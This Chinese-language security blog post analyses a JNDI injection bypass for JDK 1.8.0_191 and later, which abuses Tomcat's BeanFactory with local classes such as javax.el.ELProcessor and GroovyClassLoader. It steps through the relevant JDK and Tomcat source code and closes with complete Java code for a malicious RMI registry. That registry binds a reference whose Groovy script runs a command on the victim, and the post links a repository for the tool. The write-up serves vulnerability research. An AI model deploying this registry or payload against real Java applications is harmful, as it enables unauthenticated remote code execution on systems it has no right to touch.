之前在Veracode的这篇博客中https://www.veracode.com/blog/research/exploiting-jndi-injections-java看到对于JDK 1.8.0_191以上版本JNDI注入的绕过利用思路，简单分析了下绕过的具体实现，btw也记录下自己的一些想法，本文主要讨论基于Reference对象的利用。

## The Past

JDK版本：1.8.0_20

产生JNDI注入的原因简单来说是lookup方法参数可控，我们首先在Registry中绑定特殊构造的Reference对象，如下图所示，其中factoryLocation是我们远程类的地址。

![img](https://img2018.cnblogs.com/blog/1523493/201906/1523493-20190621191524788-1247377038.png)

然后将我们Registry的地址传入lookup方法中，下图是低版本JDK中JNDI注入payload的触发过程，lookup方法中调用了decodeObject方法，又进入到NamingManager.getObjectInstance方法

![img](https://img2018.cnblogs.com/blog/1523493/201906/1523493-20190621191606020-657623790.png)

![img](https://img2018.cnblogs.com/blog/1523493/201906/1523493-20190621191618698-961161623.png)

在getObjectInstance方法中319行，首先调用了getObjectFactoryFromReference方法，然后又调用了factory对象的getObjectInstance方法

![img](https://img2018.cnblogs.com/blog/1523493/201906/1523493-20190621191629086-1027917350.png)

在getObjectFactoryFromReference方法中动态加载了我们的远程类并将其实例化，而远程类是我们完全可控的，实例化的过程中会进行类的初始化并调用其构造方法，这就导致静态代码块或构造方法中的代码得以执行。

![img](https://img2018.cnblogs.com/blog/1523493/201906/1523493-20190621191637870-2144693487.png)

## The Present

JDK版本：1.8.0_191

高版本JDK对JNDI注入类威胁的防护主要体现在**限制了远程类的加载**，在decodeObject方法中，调用NamingManager.getObectInstance方法前加入了对factoryLocation和trustURLCodebase的判断，trustURLCodebase默认为false，如图所示，

![img](https://img2018.cnblogs.com/blog/1523493/201906/1523493-20190621191645640-758650129.png)

多个判断语句是与的逻辑关系，则可构造**factoryLocation == null**，使程序进入NamingManager.getObjectInstance方法，然后进入到getObjectFactoryFromReference方法中进行类的加载和实例化，如下图所示这块儿的逻辑是这样的，首先通过本地的类加载器去classpath中加载目标类，若classpath中无目标类的定义，则调用loadClass(factoryName, codebase)远程加载我们构造的特定类，类加载完成后通过反射将其实例化，然后在调用该对象的**getObjectInstance**方法。

![img](https://img2018.cnblogs.com/blog/1523493/201906/1523493-20190621191651721-1378867517.png)

但是若构造factoryLocation为空绕过trustURLCodebase的限制，则无法通过loadClass(factoryName, codebase)远程加载我们构造的特定类。

这时整体的绕过思路变成了加载一个目标机器classpath中存在的类，然后将其实例化，调用其getObjectInstance方法时实现代码执行。

```java
public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                    Hashtable<?,?> environment)
        throws Exception;
}
```

这个类首先要实现ObjectFactory接口，并且其getObjectInstance方法实现中有可以被用来构造exp的逻辑。

Veracode的博客中使用了org.apache.naming.factory.BeanFactory类，Tomcat容器本身是被广泛使用的，所以可利用性还是很强的。其RMIServer实现如下：

![img](https://img2018.cnblogs.com/blog/1523493/201906/1523493-20190621191701774-1436411563.png)

下面具体分析下BeanFactory类getObjectInstance方法实现，其参数中obj、name可控。

首先在前半部分代码从obj中取出我们构造的Reference对象，加载了我们指定的类并通过newInstance()调用指定类的无参构造方法将其实例化，

```java
Reference ref = (Reference) obj;
String beanClassName = ref.getClassName();
Class<?> beanClass = null;
ClassLoader tcl = 
    Thread.currentThread().getContextClassLoader();
if (tcl != null) {
    try {
        beanClass = tcl.loadClass(beanClassName);
    } catch(ClassNotFoundException e) {
    }
} else {
    try {
        beanClass = Class.forName(beanClassName);
    } catch(ClassNotFoundException e) {
        e.printStackTrace();
    }
}
·····
Object bean = beanClass.newInstance();
```

然后取出key为“forceString”的RefAddr对象中的content，对其进一步解析，content是字符串，其中可以指定多个方法用逗号分隔，如”x=eval,y=run“，解析时会将eval方法和run方法放入HashMap对象中

```java
RefAddr ra = ref.get("forceString");
Map<String, Method> forced = new HashMap<String, Method>();
String value;

if (ra != null) {
    value = (String)ra.getContent();
    Class<?> paramTypes[] = new Class[1];
    paramTypes[0] = String.class;
    String setterName;
    int index;

    /* Items are given as comma separated list */
    for (String param: value.split(",")) {
        param = param.trim();
        /* A single item can either be of the form name=method
         * or just a property name (and we will use a standard
         * setter) */
        index = param.indexOf('=');
        if (index >= 0) {
            setterName = param.substring(index + 1).trim();
            param = param.substring(0, index).trim();
        } else {
            setterName = "set" +
                         param.substring(0, 1).toUpperCase(Locale.ENGLISH) +
                         param.substring(1);
        }
        try {
            forced.put(param,
                       beanClass.getMethod(setterName, paramTypes));
```

接下来会通过反射执行我们指定的之前构造的方法，并可以传入一个字符串类型的参数

```java
Enumeration<RefAddr> e = ref.getAll();

while (e.hasMoreElements()) {
    
    ra = e.nextElement();
    String propName = ra.getType();
    
    if (propName.equals(Constants.FACTORY) ||
        propName.equals("scope") || propName.equals("auth") ||
        propName.equals("forceString") ||
        propName.equals("singleton")) {
        continue;
    }
    
    value = (String)ra.getContent();
    
    Object[] valueArray = new Object[1];
    
    /* Shortcut for properties with explicitly configured setter */
    Method method = forced.get(propName);
    if (method != null) {
        valueArray[0] = value;
        try {
            method.invoke(bean, valueArray);
        }
```

总结一下实现代码执行的几个条件，首先要注入一个含有**无参构造方法**的beanClass，当然这个beanClass要classpath中存在的，其次beanClass中要有直接或间接执行代码的方法，并且方法只能传入一个字符串参数。

Veracode的博客中构造的beanClass是javax.el.ELProcessor，ELProcessor中有个eval(String)方法可以执行EL表达式，正好符合上述条件，当然也是有限制的，javax.el.ELProcessor本身是Tomcat8中存在的库，所以仅限Tomcat8及更高版本环境下可以通过javax.el.ELProcessor进行攻击，对于使用广泛的SpringBoot应用来说，可被利用的[Spring Boot Web Starter](https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web)版本应在**1.2.x**及以上，因为**1.1.x**及**1.0.x**内置的是Tomcat7。

## The Future

除了javax.el.ELProcessor，当然也还有很多其他的类符合条件可以作为beanClass注入到BeanFactory中实现利用。举个例子，如果目标机器classpath中有groovy的库，则可以结合之前Orange师傅发过的Jenkins的漏洞实现利用https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html，直接给出RMIRegistry的代码：

```java
public static void main(String[] args) throws Exception {
    System.out.println("Creating evil RMI registry on port 1097");
    Registry registry = LocateRegistry.createRegistry(1097);
    ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
    ref.add(new StringRefAddr("forceString", "x=parseClass"));
    String script = "@groovy.transform.ASTTest(value={\n" +
        "    assert java.lang.Runtime.getRuntime().exec(\"calc\")\n" +
        "})\n" +
        "def x\n";
    ref.add(new StringRefAddr("x",script));

    ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
    registry.bind("Object", referenceWrapper);
}
```

如果能有一个JDK中的类符合条件，可攻击面就更大了，可惜我在尝试构造exp的过程中并没有找到相关可利用的类，但是与第三方库的组合利用方法还是很多的，上面只是举了其中一个例子，感兴趣的朋友可以一起探讨，上述代码地址：https://github.com/welk1n/JNDI-Injection-Bypass